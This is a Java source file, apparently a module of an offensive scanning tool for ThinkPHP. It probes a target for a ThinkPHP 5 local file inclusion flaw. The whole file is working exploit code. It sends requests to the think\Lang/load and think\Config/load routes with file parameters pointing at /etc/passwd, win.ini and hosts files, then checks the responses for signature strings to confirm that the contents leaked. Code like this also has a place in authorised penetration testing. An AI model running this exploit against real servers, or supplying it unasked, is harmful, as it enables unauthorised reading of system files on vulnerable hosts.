package exploit;

import com.example.thinkphpgui.ConfigManager;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.stream.Stream;

import com.example.thinkphpgui.Exploit;
import com.example.thinkphpgui.utils.HttpRequestUtil;

public class Tp5_Lfi implements Exploit{

    ConfigManager configManager = ConfigManager.getInstance();
    private final List<String> fileList = new ArrayList<>(
            Arrays.asList(
                    "/etc/passwd",
                    "C:\\windows\\win.ini",
                    "/etc/hosts",
                    "C:\\Windows\\System32\\drivers\\etc\\hosts",
                    "C:\\Windows\\System32\\drivers\\etc\\services"
            )
    );

    private final List<String> paramList = new ArrayList<>(
            Arrays.asList(
                    "?s=index/\\think\\Lang/load&file=",
                    "?s=index/\\think\\Config/load&file="
            )
    );


    private void verify(String url) {
        for (String param : paramList) {
            for (String file : fileList) {
                try {
                    HttpURLConnection httpURLConnection=HttpRequestUtil.get(url + param + file);
                    //成功之后状态码一般为500
                    BufferedReader bufferedReader;

                    if (httpURLConnection.getResponseCode() >= 400) {
                        bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getErrorStream()));
                    } else {
                        bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
                    }
                    String line;
                    while ((line = bufferedReader.readLine()) != null) {
                        if (Stream.of("[mci extensions]","Microsoft Corp.","sbin/nologin","The following lines","127.0.0.1","::1","localhost").anyMatch(line::contains)) {
                            configManager.appendToTextArea("[+] " + url + " 存在TP 5 file_inclusion 漏洞 " + url + param + file);
                            return;
                        }
                    }

                } catch (Exception e) {
                    e.printStackTrace();
                }
            }

        }

        configManager.appendToTextArea("[-] " + url + " 不存在TP 5 file_inclusion 漏洞");

    }


    @Override
    public void startScan(String url) {

        verify(url);

    }
}
